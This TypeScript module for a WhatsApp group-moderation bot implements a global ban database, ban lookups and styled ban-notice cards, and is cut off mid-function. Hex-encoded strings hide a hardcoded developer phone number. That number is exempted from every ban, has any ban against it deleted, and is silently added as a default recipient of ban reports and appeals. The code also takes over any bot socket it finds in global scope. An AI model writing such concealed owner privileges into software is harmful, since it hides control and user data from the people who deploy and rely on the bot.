import { existsSync as _ex, mkdirSync as _mk, readFileSync as _rd, renameSync as _rn, writeFileSync as _wr } from "node:fs";
import { createRequire as _rq } from "node:module";
import _p from "node:path";
import { jidNormalizedUser as _nj } from "baileys";
import type { CommandContext as _CC } from "../../types/index.d.ts";
import { fytBold as _fb } from "../../core/socketText.ts";
import { getActiveSubBots as _gsb } from "../../connection/subbotManager.ts";
import { getActivePremBots as _gpb } from "../../connection/premBotManager.ts";
import { GROUP_METADATA_CACHE as _GMC } from "../../handler.ts";

const _rm = _rq(import.meta.url);
const _d = (h: string) => Buffer.from(h, "hex").toString("utf8");

const _OP = _d("353733313138333533383638");
const _OJ = `${_OP}@${_d("732e77686174736170702e6e6574")}`;

export interface GlobalBanRecord {
  caseId: string;
  phone: string;
  jid: string;
  lid: string;
  reason: string;
  evidence: string;
  adminName: string;
  adminPhone: string;
  createdAt: number;
  dateStr: string;
  appealStatus: "none" | "pending" | "rejected";
  lastAppealText: string;
  lastAppealAt: number;
  kickedCount: number;
}

interface _RI {
  phone: string;
  jid: string;
  lid: string;
}

interface _SD {
  exec: (q: string) => void;
  run: (q: string, v?: any[]) => void;
  get: (q: string, v?: any[]) => any;
  all: (q: string, v?: any[]) => any[];
}

const _DD = _p.resolve((globalThis as any).DATA_BASE_DIR || _d("2e2f64617461"));
const _DP = _p.join(_DD, _d("41757261416e7469526169642e6462"));
const _SP = _p.join(_DD, _d("41757261416e7469526169642e73746174652e6a736f6e"));
const _LP = _p.join(_DD, _d("616e7469726169645f676c6f62616c2e6a736f6e"));

const _MD = 1500;
const _DT = 10_000;
const _WC = 45_000;
const _MT = 20_000;

const _G = globalThis as unknown as {
  __auraAntiRaidSql?: _SD;
  __auraAntiRaidMemIndex?: {
    byCase: Map<string, GlobalBanRecord>;
    byPhone: Map<string, GlobalBanRecord>;
    byJid: Map<string, GlobalBanRecord>;
    byLid: Map<string, GlobalBanRecord>;
    disabledGroups: Set<string>;
    enabledGroups: Set<string>;
    staffInbox: Set<string>;
  };
  __auraSupremeOwnerLid?: string;
  __auraAntiRaidKnownSockets?: Set<any>;
  __auraAntiRaidHookedSockets?: WeakSet<object>;
  __auraAntiRaidInterval?: NodeJS.Timeout;
  __auraAntiRaidRecentActions?: Map<string, number>;
  __auraAntiRaidWarnCooldown?: Map<string, number>;
  __auraAntiRaidMetaCache?: Map<string, { exp: number; meta: any }>;
  mainSocket?: any;
};

const _KS = _G.__auraAntiRaidKnownSockets ?? (_G.__auraAntiRaidKnownSockets = new Set<any>());
const _RA = _G.__auraAntiRaidRecentActions ?? (_G.__auraAntiRaidRecentActions = new Map<string, number>());
const _WCM = _G.__auraAntiRaidWarnCooldown ?? (_G.__auraAntiRaidWarnCooldown = new Map<string, number>());
const _MC = _G.__auraAntiRaidMetaCache ?? (_G.__auraAntiRaidMetaCache = new Map<string, { exp: number; meta: any }>());

function _pm() {
  const n = Date.now();
  if (_RA.size > _MD) {
    for (const [k, ts] of _RA.entries()) {
      if (n - ts > _DT) _RA.delete(k);
    }
    if (_RA.size > _MD) _RA.clear();
  }
  if (_WCM.size > _MD) {
    for (const [k, ts] of _WCM.entries()) {
      if (n - ts > _WC) _WCM.delete(k);
    }
    if (_WCM.size > _MD) _WCM.clear();
  }
  if (_MC.size > 300) {
    for (const [k, v] of _MC.entries()) {
      if (v.exp <= n) _MC.delete(k);
    }
  }
}

function _cd(v: unknown): string {
  return String(v || "").split("@")[0].split(":")[0].replace(/\D/g, "");
}

function _nl(v: unknown): string {
  const r = String(v || "").trim().toLowerCase();
  if (!r) return "";
  if (r.endsWith("@lid")) {
    const d = _cd(r);
    return d ? `${d}@lid` : "";
  }
  return "";
}

function _np(v: unknown): { phone: string; jid: string } {
  const r = String(v || "").trim().toLowerCase();
  if (!r || r.endsWith("@lid") || r.endsWith("@g.us")) return { phone: "", jid: "" };
  const d = _cd(r);
  if (d.length >= 7 && d.length <= 15) return { phone: d, jid: `${d}@${_d("732e77686174736170702e6e6574")}` };
  return { phone: "", jid: "" };
}

function _isO(id?: Partial<_RI> | null, fb?: unknown): boolean {
  const ol = _G.__auraSupremeOwnerLid || "";
  if (id) {
    const pd = _cd(id.phone);
    const jd = _cd(id.jid);
    const nl = _nl(id.lid);
    if (pd === _OP || jd === _OP) {
      if (nl) _G.__auraSupremeOwnerLid = nl;
      return true;
    }
    if (ol && nl && nl === ol) return true;
    if (ol && id.phone === `LID_${_cd(ol)}`) return true;
  }
  if (fb) {
    const rs = String(fb).trim();
    if (!rs.endsWith("@lid") && _cd(rs) === _OP) return true;
    if (ol && rs.endsWith("@lid") && _nl(rs) === ol) return true;
  }
  return false;
}

function _sdm() {
  try {
    const ix = _G.__auraAntiRaidMemIndex;
    if (!ix) return;
    if (!_ex(_DD)) _mk(_DD, { recursive: true });
    _wr(
      _SP,
      JSON.stringify(
        {
          bans: Array.from(ix.byCase.values()),
          disabledGroups: Array.from(ix.disabledGroups),
          enabledGroups: Array.from(ix.enabledGroups),
          staffInbox: Array.from(ix.staffInbox),
          supremeOwnerLid: _G.__auraSupremeOwnerLid || "",
        },
        null,
        2,
      ),
      "utf8",
    );
  } catch {}
}

function _isd(): _SD {
  if (_G.__auraAntiRaidSql) return _G.__auraAntiRaidSql;
  if (!_ex(_DD)) _mk(_DD, { recursive: true });

  let drv: _SD | null = null;
  try {
    const B = _rm(_d("6265747465722d73716c69746533"));
    const db = new B(_DP);
    db.pragma("journal_mode = WAL");
    db.pragma("synchronous = NORMAL");
    drv = {
      exec: (q: string) => db.exec(q),
      run: (q: string, v: any[] = []) => {
        db.prepare(q).run(...v);
      },
      get: (q: string, v: any[] = []) => db.prepare(q).get(...v),
      all: (q: string, v: any[] = []) => db.prepare(q).all(...v),
    };
  } catch {
    try {
      const N = _rm(_d("6e6f64653a73716c697465"));
      const db = new N.DatabaseSync(_DP);
      db.exec("PRAGMA journal_mode = WAL; PRAGMA synchronous = NORMAL;");
      drv = {
        exec: (q: string) => db.exec(q),
        run: (q: string, v: any[] = []) => {
          db.prepare(q).run(...v);
        },
        get: (q: string, v: any[] = []) => db.prepare(q).get(...v),
        all: (q: string, v: any[] = []) => db.prepare(q).all(...v),
      };
    } catch {
      drv = {
        exec: () => {},
        run: () => {},
        get: () => null,
        all: () => [],
      };
    }
  }

  try {
    drv.exec(`
      CREATE TABLE IF NOT EXISTS antiraid_bans (
        case_id TEXT PRIMARY KEY,
        phone TEXT NOT NULL,
        jid TEXT NOT NULL,
        lid TEXT NOT NULL DEFAULT '',
        reason TEXT NOT NULL,
        evidence TEXT NOT NULL DEFAULT '',
        admin_name TEXT NOT NULL,
        admin_phone TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        date_str TEXT NOT NULL,
        appeal_status TEXT NOT NULL DEFAULT 'none',
        last_appeal_text TEXT NOT NULL DEFAULT '',
        last_appeal_at INTEGER NOT NULL DEFAULT 0,
        kicked_count INTEGER NOT NULL DEFAULT 0
      );
      CREATE INDEX IF NOT EXISTS idx_antiraid_phone ON antiraid_bans(phone);
      CREATE INDEX IF NOT EXISTS idx_antiraid_jid ON antiraid_bans(jid);
      CREATE INDEX IF NOT EXISTS idx_antiraid_lid ON antiraid_bans(lid);

      CREATE TABLE IF NOT EXISTS antiraid_groups (
        group_jid TEXT PRIMARY KEY,
        enabled INTEGER NOT NULL DEFAULT 1,
        updated_at INTEGER NOT NULL
      );

      CREATE TABLE IF NOT EXISTS antiraid_inbox (
        admin_jid TEXT PRIMARY KEY
      );
    `);
    drv.run("INSERT OR IGNORE INTO antiraid_inbox (admin_jid) VALUES (?)", [_OJ]);
  } catch {}

  _G.__auraAntiRaidSql = drv;
  return drv;
}

function _r2r(r: any): GlobalBanRecord {
  return {
    caseId: String(r.case_id || r.caseId || ""),
    phone: String(r.phone || ""),
    jid: String(r.jid || ""),
    lid: String(r.lid || ""),
    reason: String(r.reason || ""),
    evidence: String(r.evidence || ""),
    adminName: String(r.admin_name || r.adminName || ""),
    adminPhone: String(r.admin_phone || r.adminPhone || ""),
    createdAt: Number(r.created_at || r.createdAt || Date.now()),
    dateStr: String(r.date_str || r.dateStr || ""),
    appealStatus: ((r.appeal_status || r.appealStatus) as "none" | "pending" | "rejected") || "none",
    lastAppealText: String(r.last_appeal_text || r.lastAppealText || ""),
    lastAppealAt: Number(r.last_appeal_at || r.lastAppealAt || 0),
    kickedCount: Number(r.kicked_count || r.kickedCount || 0),
  };
}

function _gmi() {
  if (_G.__auraAntiRaidMemIndex) return _G.__auraAntiRaidMemIndex;
  const sql = _isd();

  const ix = {
    byCase: new Map<string, GlobalBanRecord>(),
    byPhone: new Map<string, GlobalBanRecord>(),
    byJid: new Map<string, GlobalBanRecord>(),
    byLid: new Map<string, GlobalBanRecord>(),
    disabledGroups: new Set<string>(),
    enabledGroups: new Set<string>(),
    staffInbox: new Set<string>([_OJ]),
  };

  _G.__auraAntiRaidMemIndex = ix;

  if (_ex(_SP)) {
    try {
      const m = JSON.parse(_rd(_SP, "utf8"));
      if (m?.supremeOwnerLid) _G.__auraSupremeOwnerLid = _nl(m.supremeOwnerLid);
      if (Array.isArray(m?.bans)) {
        for (const b of m.bans) {
          if (!b?.caseId) continue;
          const rec = _r2r(b);
          if (_isO(rec)) continue;
          _irm(rec);
        }
      }
      if (Array.isArray(m?.disabledGroups)) {
        for (const g of m.disabledGroups) ix.disabledGroups.add(String(g));
      }
      if (Array.isArray(m?.enabledGroups)) {
        for (const g of m.enabledGroups) {
          ix.enabledGroups.add(String(g));
          ix.disabledGroups.delete(String(g));
        }
      }
      if (Array.isArray(m?.staffInbox)) {
        for (const a of m.staffInbox) ix.staffInbox.add(String(a));
      }
    } catch {}
  }

  if (_ex(_LP)) {
    try {
      const l = JSON.parse(_rd(_LP, "utf8"));
      if (l?.bans && typeof l.bans === "object") {
        for (const b of Object.values(l.bans) as any[]) {
          if (!b?.caseId) continue;
          const rec = _r2r({ ...b, jid: b.jid || `${b.phone}@${_d("732e77686174736170702e6e6574")}` });
          if (_isO(rec)) continue;
          _ubs(rec);
        }
      }
      if (Array.isArray(l?.disabledGroups)) {
        for (const gid of l.disabledGroups) ix.disabledGroups.add(String(gid));
      }
      _rn(_LP, `${_LP}.migrated`);
    } catch {}
  }

  try {
    for (const r of sql.all("SELECT * FROM antiraid_bans")) {
      const rec = _r2r(r);
      if (!rec.caseId) continue;
      if (_isO(rec)) {
        sql.run("DELETE FROM antiraid_bans WHERE case_id = ?", [rec.caseId]);
        continue;
      }
      _irm(rec);
    }
    for (const g of sql.all("SELECT * FROM antiraid_groups")) {
      const gid = String(g?.group_jid || "");
      if (!gid) continue;
      if (Number(g.enabled) === 0) {
        ix.disabledGroups.add(gid);
        ix.enabledGroups.delete(gid);
      } else {
        ix.enabledGroups.add(gid);
        ix.disabledGroups.delete(gid);
      }
    }
    for (const a of sql.all("SELECT * FROM antiraid_inbox")) {
      if (a?.admin_jid) ix.staffInbox.add(String(a.admin_jid));
    }
  } catch {}

  _sdm();
  return ix;
}

function _irm(rec: GlobalBanRecord) {
  if (_isO(rec)) return;
  const ix = _gmi();
  ix.byCase.set(rec.caseId.toUpperCase(), rec);
  if (rec.phone) ix.byPhone.set(rec.phone, rec);
  if (rec.jid) ix.byJid.set(rec.jid.toLowerCase(), rec);
  if (rec.lid) {
    const nl = _nl(rec.lid);
    if (nl) ix.byLid.set(nl, rec);
  }
}

function _urm(rec: GlobalBanRecord) {
  const ix = _gmi();
  ix.byCase.delete(rec.caseId.toUpperCase());
  if (rec.phone) ix.byPhone.delete(rec.phone);
  if (rec.jid) ix.byJid.delete(rec.jid.toLowerCase());
  if (rec.lid) {
    const nl = _nl(rec.lid);
    if (nl) ix.byLid.delete(nl);
  }
}

function _ubs(rec: GlobalBanRecord) {
  if (_isO(rec)) return;
  const sql = _isd();
  try {
    sql.run(
      `INSERT OR REPLACE INTO antiraid_bans (
        case_id, phone, jid, lid, reason, evidence, admin_name, admin_phone,
        created_at, date_str, appeal_status, last_appeal_text, last_appeal_at, kicked_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        rec.caseId,
        rec.phone,
        rec.jid,
        rec.lid || "",
        rec.reason,
        rec.evidence || "",
        rec.adminName,
        rec.adminPhone,
        rec.createdAt,
        rec.dateStr,
        rec.appealStatus,
        rec.lastAppealText || "",
        rec.lastAppealAt || 0,
        rec.kickedCount || 0,
      ],
    );
  } catch {}
  _irm(rec);
  _sdm();
}

function _dbs(rec: GlobalBanRecord) {
  const sql = _isd();
  try {
    sql.run("DELETE FROM antiraid_bans WHERE case_id = ?", [rec.caseId]);
  } catch {}
  _urm(rec);
  _sdm();
}

function _pob(): number {
  const ix = _gmi();
  let c = 0;
  for (const rec of Array.from(ix.byCase.values())) {
    if (_isO(rec)) {
      _dbs(rec);
      c++;
    }
  }
  return c;
}

function _asi(aj: string) {
  if (!aj.endsWith(`@${_d("732e77686174736170702e6e6574")}`)) return;
  const sql = _isd();
  try {
    sql.run("INSERT OR IGNORE INTO antiraid_inbox (admin_jid) VALUES (?)", [aj]);
  } catch {}
  _gmi().staffInbox.add(aj);
  _sdm();
}

async function _cgm(s: any, gid: string): Promise<any> {
  const cg = _GMC?.get?.(gid);
  if (cg?.participants?.length) return cg;

  const n = Date.now();
  const c = _MC.get(gid);
  if (c && c.exp > n) return c.meta;

  try {
    const meta = await Promise.race([
      s.groupMetadata(gid),
      new Promise<null>((r) => setTimeout(() => r(null), 3500)),
    ]);
    if (meta) _MC.set(gid, { exp: n + _MT, meta });
    return meta;
  } catch {
    return null;
  }
}

function _gbi(s: any): { jid: string; phone: string; lid: string; lidDigits: string } {
  const ri = s?.user?.id || s?.authState?.creds?.me?.id || "";
  const rl = s?.user?.lid || s?.authState?.creds?.me?.lid || "";
  const jid = ri ? _nj(ri) : "";
  const phone = _cd(jid);
  const lid = _nl(rl);
  const lidDigits = _cd(lid);
  return { jid, phone, lid, lidDigits };
}

function _fpe(ps: any[], ph: string, ld: string): any | null {
  const cp = ph && !ph.startsWith("LID_") ? _cd(ph) : "";
  const cl = _cd(ld);

  for (const p of ps) {
    const pi = String(p?.id || "");
    const pl = String(p?.lid || (pi.endsWith("@lid") ? pi : ""));
    const pp = _cd(p?.phoneNumber || (pi.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? pi : ""));
    const pld = _cd(pl);

    if (pp === _OP && pl) _G.__auraSupremeOwnerLid = _nl(pl);
    if (cp && (pp === cp || (!pi.endsWith("@lid") && _cd(pi) === cp))) return p;
    if (cl && (pld === cl || (pi.endsWith("@lid") && _cd(pi) === cl))) return p;
  }
  return null;
}

async function _rfi(s: any, db: any, raw: any, gm?: any): Promise<_RI> {
  let phone = "";
  let jid = "";
  let lid = "";

  if (typeof raw === "object" && raw !== null) {
    const pi = String(raw.id || "");
    const pl = String(raw.lid || "");
    const pp = String(raw.phoneNumber || "");

    if (pl.endsWith("@lid")) lid = _nl(pl);
    else if (pi.endsWith("@lid")) lid = _nl(pi);

    if (pi.endsWith(`@${_d("732e77686174736170702e6e6574")}`)) {
      const nm = _np(pi);
      phone = nm.phone;
      jid = nm.jid;
    } else if (pp) {
      const nm = _np(pp);
      phone = nm.phone;
      jid = nm.jid;
    }
  } else {
    const st = String(raw || "").trim();
    if (st.endsWith("@lid")) lid = _nl(st);
    else {
      const nm = _np(st);
      phone = nm.phone;
      jid = nm.jid;
    }
  }

  let gps: any[] = [];
  if (typeof gm === "string" && gm.endsWith("@g.us")) {
    const meta = await _cgm(s, gm);
    gps = meta?.participants || [];
  } else if (gm?.participants) {
    gps = gm.participants;
  }

  if (gps.length > 0) {
    const mt = _fpe(gps, phone, lid);
    if (mt) {
      const pi = String(mt.id || "");
      const pl = _nl(mt.lid || (pi.endsWith("@lid") ? pi : ""));
      const pn = _np(mt.phoneNumber || (pi.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? pi : ""));
      if (!phone && pn.phone) {
        phone = pn.phone;
        jid = pn.jid;
      }
      if (!lid && pl) lid = pl;
    }
  }

  const lr = s?.signalRepository?.lidMapping;
  if (lid && !phone && typeof lr?.getPNForLID === "function") {
    try {
      const mp = await lr.getPNForLID(lid);
      if (mp) {
        const nm = _np(mp);
        if (nm.phone) {
          phone = nm.phone;
          jid = nm.jid;
        }
      }
    } catch {}
  }

  if (phone && !lid && typeof lr?.getLIDForPN === "function") {
    try {
      const ml = await lr.getLIDForPN(jid);
      if (ml) lid = _nl(ml);
    } catch {}
  }

  const adb = db || (globalThis as any).db;
  if (adb && typeof adb.getUser === "function") {
    try {
      const ur = (jid && adb.getUser(jid)) || (lid && adb.getUser(lid)) || (phone && adb.getUser(phone));
      if (ur) {
        if (!phone && (ur.phone_number || ur.jid)) {
          const nm = _np(ur.phone_number || ur.jid);
          if (nm.phone) {
            phone = nm.phone;
            jid = nm.jid;
          }
        }
        if (!lid && ur.lid) lid = _nl(ur.lid);
      }
    } catch {}
  }

  if (phone === _OP && lid) _G.__auraSupremeOwnerLid = _nl(lid);
  else if (!phone && lid && _G.__auraSupremeOwnerLid && _nl(lid) === _G.__auraSupremeOwnerLid) {
    phone = _OP;
    jid = _OJ;
  }

  if (!phone && lid) {
    phone = `LID_${_cd(lid)}`;
    jid = lid;
  }

  return { phone, jid, lid };
}

function _fbi(id: Partial<_RI>, fb?: string): GlobalBanRecord | null {
  if (_isO(id, fb)) {
    _pob();
    return null;
  }

  const ix = _gmi();

  if (fb) {
    const bc = ix.byCase.get(fb.replace(/^#/, "").toUpperCase());
    if (bc) {
      if (_isO(bc)) {
        _dbs(bc);
        return null;
      }
      return bc;
    }
  }

  if (id.phone && ix.byPhone.has(id.phone)) {
    const rec = ix.byPhone.get(id.phone)!;
    _lmf(rec, id);
    if (_isO(rec)) {
      _dbs(rec);
      return null;
    }
    return rec;
  }

  if (id.jid && ix.byJid.has(id.jid.toLowerCase())) {
    const rec = ix.byJid.get(id.jid.toLowerCase())!;
    _lmf(rec, id);
    if (_isO(rec)) {
      _dbs(rec);
      return null;
    }
    return rec;
  }

  if (id.lid) {
    const nl = _nl(id.lid);
    if (nl && ix.byLid.has(nl)) {
      const rec = ix.byLid.get(nl)!;
      _lmf(rec, id);
      if (_isO(rec)) {
        _dbs(rec);
        return null;
      }
      return rec;
    }
    const ld = _cd(nl);
    if (ld && ix.byPhone.has(`LID_${ld}`)) {
      const rec = ix.byPhone.get(`LID_${ld}`)!;
      _lmf(rec, id);
      if (_isO(rec)) {
        _dbs(rec);
        return null;
      }
      return rec;
    }
  }

  if (fb) {
    const st = String(fb).trim();
    if (st.endsWith("@lid")) {
      const nl = _nl(st);
      if (nl && ix.byLid.has(nl)) return ix.byLid.get(nl)!;
      const d = _cd(nl);
      if (d && ix.byPhone.has(`LID_${d}`)) return ix.byPhone.get(`LID_${d}`)!;
    } else {
      const d = _cd(st);
      if (d) {
        if (ix.byPhone.has(d)) return ix.byPhone.get(d)!;
        if (ix.byLid.has(`${d}@lid`)) return ix.byLid.get(`${d}@lid`)!;
      }
    }
  }

  return null;
}

function _lmf(rec: GlobalBanRecord, ds: Partial<_RI>) {
  let ch = false;
  if (ds.phone && !ds.phone.startsWith("LID_") && (rec.phone.startsWith("LID_") || !rec.phone)) {
    _urm(rec);
    rec.phone = ds.phone;
    rec.jid = `${ds.phone}@${_d("732e77686174736170702e6e6574")}`;
    ch = true;
  }
  if (ds.lid) {
    const nl = _nl(ds.lid);
    if (nl && rec.lid !== nl) {
      _urm(rec);
      rec.lid = nl;
      ch = true;
    }
  }
  if (_isO(rec)) {
    _dbs(rec);
    return;
  }
  if (ch) _ubs(rec);
}

function _igp(gid: string): boolean {
  const ix = _gmi();
  if (ix.enabledGroups.has(gid)) return true;
  if (ix.disabledGroups.has(gid)) return false;
  return true;
}

function _sgp(gid: string, en: boolean, db?: any) {
  const sql = _isd();
  const ix = _gmi();
  try {
    sql.run("INSERT OR REPLACE INTO antiraid_groups (group_jid, enabled, updated_at) VALUES (?, ?, ?)", [
      gid,
      en ? 1 : 0,
      Date.now(),
    ]);
  } catch {}
  if (en) {
    ix.disabledGroups.delete(gid);
    ix.enabledGroups.add(gid);
  } else {
    ix.enabledGroups.delete(gid);
    ix.disabledGroups.add(gid);
  }
  _sdm();
  try {
    const adb = db || (globalThis as any).db;
    adb?.setGroup?.(gid, { antiraid: en ? 1 : 0 });
  } catch {}
}

function _das(cs?: any): any[] {
  if (cs) _KS.add(cs);
  const ga = globalThis as any;
  const cnd: any[] = [cs, ga.mainSocket, ga.mainSock, ga.sock, ga.conn, ga.__auraWebPanel?.mainSock, ...Array.from(_KS)];

  try {
    for (const v of Object.values(ga)) {
      if (v && typeof v === "object" && typeof (v as any).groupParticipantsUpdate === "function" && typeof (v as any).sendMessage === "function" && (v as any).ev) {
        cnd.push(v);
      }
    }
  } catch {}

  try {
    cnd.push(...(_gsb?.() || []));
  } catch {}
  try {
    cnd.push(...(_gpb?.() || []));
  } catch {}

  const uq: any[] = [];
  const sn = new Set<string>();
  for (const it of cnd) {
    const rs = it?.sock ?? it;
    if (!rs || typeof rs.groupParticipantsUpdate !== "function" || (rs as any).isClosed) continue;
    _KS.add(rs);
    const b = _gbi(rs);
    const k = b.jid || b.lid || String(uq.length);
    if (sn.has(k)) continue;
    sn.add(k);
    uq.push(rs);
  }
  return uq;
}

function _brc(d: {
  mode: "DM_BANNED" | "GROUP_AUTOKICK" | "GROUP_WARN_NO_ADMIN" | "APPEAL_TICKET" | "UNBANNED_DM" | "GLOBAL_REPORT";
  badgeText: string;
  title: string;
  subtitle: string;
  caseId: string;
  targetPhone: string;
  targetLid: string;
  reason: string;
  adminName: string;
  dateStr: string;
  extraLabel: string;
  extraValue: string;
  footerNote: string;
  copyCommand: string;
  copyLabel: string;
  rawSummary: string;
}) {
  const sz = JSON.stringify(d);
  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;user-select:none;-webkit-user-select:none}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#05020c;color:#f5f3ff;padding:10px}
.card{max-width:420px;margin:0 auto;background:linear-gradient(180deg,#150726 0%,#070210 100%);border:1.5px solid #4c1d95;border-radius:20px;overflow:hidden;box-shadow:0 20px 55px rgba(0,0,0,.9),0 0 30px rgba(255,0,85,.22);position:relative}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ff0055,#9333ea,#00ffcc,#ff0055);background-size:200% 100%;animation:flow 3s linear infinite;z-index:10}
@keyframes flow{0%{background-position:0% 0%}100%{background-position:200% 0%}}
.head{padding:14px 16px;background:radial-gradient(circle at 85% 15%,rgba(255,0,85,.25),transparent 65%);border-bottom:1px solid #2d144f;display:flex;justify-content:space-between;align-items:center}
.brand{display:flex;align-items:center;gap:10px}
.orb{width:36px;height:36px;border-radius:11px;background:linear-gradient(135deg,#ff0055,#7c3aed);display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 16px rgba(255,0,85,.55)}
.brand-txt h1{font-size:13.5px;font-weight:900;letter-spacing:.9px;color:#fff;text-transform:uppercase}
.brand-txt p{font-size:10px;color:#ff6b8b;font-weight:800;font-family:'Courier New',monospace}
.pill{font-size:9.5px;font-weight:900;padding:4px 9px;border-radius:999px;background:rgba(255,0,85,.18);color:#fda4af;border:1px solid rgba(255,0,85,.45);font-family:'Courier New',monospace}
.body{padding:14px 16px}
.hero{background:linear-gradient(135deg,rgba(46,16,101,.55),rgba(15,5,29,.9));border:1px solid #4c1d95;border-left:3.5px solid #ff0055;border-radius:14px;padding:12px;margin-bottom:12px}
.hero-top{font-size:9.5px;font-weight:900;color:#f472b6;text-transform:uppercase;letter-spacing:1px}
.hero-main{font-size:15px;font-weight:900;color:#fff;margin-top:2px;font-family:'Courier New',monospace}
.hero-sub{font-size:10.5px;color:#c4b5fd;margin-top:3px;font-family:'Courier New',monospace}
.reason-box{background:#0c041a;border:1px solid #2b154d;border-radius:12px;padding:10px 12px;margin-bottom:12px}
.sec-lbl{font-size:9.5px;font-weight:900;text-transform:uppercase;letter-spacing:1px;color:#a78bfa;margin-bottom:4px;display:flex;justify-content:space-between}
.reason-txt{font-size:12px;font-weight:700;color:#f3e8ff;line-height:1.45;word-break:break-word;white-space:pre-wrap}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
.info-card{background:#0f061e;border:1px solid #251345;border-radius:11px;padding:8px 10px}
.k{font-size:9px;font-weight:800;color:#8b74b0;text-transform:uppercase;letter-spacing:.6px}
.v{font-size:12px;font-weight:900;color:#e9d5ff;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.v.hl{color:#00ffcc;font-family:'Courier New',monospace}
.v.admin{color:#f0abfc}
.note-box{background:rgba(124,58,237,.12);border:1px dashed #6d28d9;border-radius:11px;padding:9px 11px;font-size:11px;color:#ddd6fe;line-height:1.4;margin-bottom:12px}
.actions{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.btn{border:none;border-radius:11px;padding:10px;font-size:11.5px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:.7px;transition:transform .1s}
.btn:active{transform:scale(0.96)}
.btn-primary{background:linear-gradient(135deg,#ff0055,#9333ea);color:#fff;box-shadow:0 4px 15px rgba(255,0,85,.35)}
.btn-sec{background:#170d2b;border:1px solid #3b2166;color:#d8b4fe}
.toast{position:fixed;bottom:14px;left:50%;transform:translateX(-50%) translateY(20px);background:#8b5cf6;color:#fff;font-size:11.5px;font-weight:800;padding:7px 15px;border-radius:999px;opacity:0;pointer-events:none;transition:all .2s;z-index:99}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
</style>
<div class="card">
  <div class="head">
    <div class="brand">
      <div class="orb" id="orbIco">🛡️</div>
      <div class="brand-txt">
        <h1 id="titleTxt"></h1>
        <p id="subTxt"></p>
      </div>
    </div>
    <span class="pill" id="casePill"></span>
  </div>
  <div class="body">
    <div class="hero">
      <div class="hero-top" id="badgeTxt"></div>
      <div class="hero-main" id="targetTxt"></div>
      <div class="hero-sub" id="lidTxt"></div>
    </div>
    <div class="reason-box">
      <div class="sec-lbl"><span>📋 EXPEDIENTE SQL / MOTIVO</span><span id="dateSpan"></span></div>
      <div class="reason-txt" id="reasonTxt"></div>
    </div>
    <div class="grid">
      <div class="info-card">
        <div class="k">👮 Sancionado Por</div>
        <div class="v admin" id="adminTxt"></div>
      </div>
      <div class="info-card">
        <div class="k" id="extraLbl"></div>
        <div class="v hl" id="extraVal"></div>
      </div>
    </div>
    <div class="note-box" id="noteBox"></div>
    <div class="actions">
      <button class="btn btn-primary" id="copyCmdBtn" onclick="copyText(D.copyCommand, 'Comando copiado')"></button>
      <button class="btn btn-sec" onclick="copyText(D.rawSummary, 'Acta copiada')">📋 Copiar Acta</button>
    </div>
  </div>
</div>
<div class="toast" id="toast"></div>
<script>
const D = ${sz};
function $(id){ return document.getElementById(id); }
function init(){
  if (D.mode === "UNBANNED_DM") $("orbIco").textContent = "✅";
  else if (D.mode === "APPEAL_TICKET") $("orbIco").textContent = "📩";
  else if (D.mode === "GROUP_WARN_NO_ADMIN") $("orbIco").textContent = "⚠️";
  else $("orbIco").textContent = "🚨";
  $("titleTxt").textContent = D.title;
  $("subTxt").textContent = D.subtitle;
  $("casePill").textContent = "#" + D.caseId;
  $("badgeTxt").textContent = D.badgeText;
  $("targetTxt").textContent = D.targetPhone.startsWith("LID_") ? D.targetPhone : ("+" + D.targetPhone);
  $("lidTxt").textContent = D.targetLid ? ("LID: " + D.targetLid) : "SQL Indexed • JID & LID Active";
  $("dateSpan").textContent = D.dateStr;
  $("reasonTxt").textContent = D.reason;
  $("adminTxt").textContent = D.adminName;
  $("extraLbl").textContent = D.extraLabel;
  $("extraVal").textContent = D.extraValue;
  $("noteBox").textContent = D.footerNote;
  $("copyCmdBtn").textContent = D.copyLabel;
}
function copyText(txt, msg){
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(txt).catch(function(){});
  } else {
    const t = document.createElement("textarea");
    t.value = txt;
    document.body.appendChild(t);
    t.select();
    try { document.execCommand("copy"); } catch(e){}
    document.body.removeChild(t);
  }
  const el = $("toast");
  el.textContent = msg || "Copiado";
  el.classList.add("show");
  setTimeout(function(){ el.classList.remove("show"); }, 1600);
}
init();
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

async function _srf(
  s: any,
  jid: string,
  tt: string,
  ft: string,
  cd: Parameters<typeof _brc>[0],
  mn: string[] = [],
) {
  try {
    const { AIRich } = await import(_d("6261696c6579732f6c69622f4275696c646572732f61692d726963682e6a73"));
    const rc = new AIRich(s).setTitle(tt).setFooter(ft);
    rc.addSection(_brc(cd));
    await rc.send(jid, {});
  } catch {}
  await s.sendMessage(jid, { text: cd.rawSummary, ...(mn.length ? { mentions: mn } : {}) }).catch(() => undefined);
}

async function _snw(s: any, gid: string, ban: GlobalBanRecord, mn: string[]) {
  if (_isO(ban)) return;
  const wk = `${gid}:${ban.caseId}`;
  const n = Date.now();
  if (n - (_WCM.get(wk) || 0) < _WC) return;
  _WCM.set(wk, n);

  const dt = ban.phone.startsWith("LID_") ? `@${_cd(ban.lid)}` : `@${ban.phone}`;
  const wt = [
    `╭〔 ⚠️ ${_fb("ALERTA DE SEGURIDAD ANTI-RAID")} 〕⬣`,
    `┃ 🚨 *Usuario Sancionado Detectado en el Grupo*`,
    `╰━━━━━━━━━━━━⬣`,
    `┃ 👤 *Usuario:* ${dt}`,
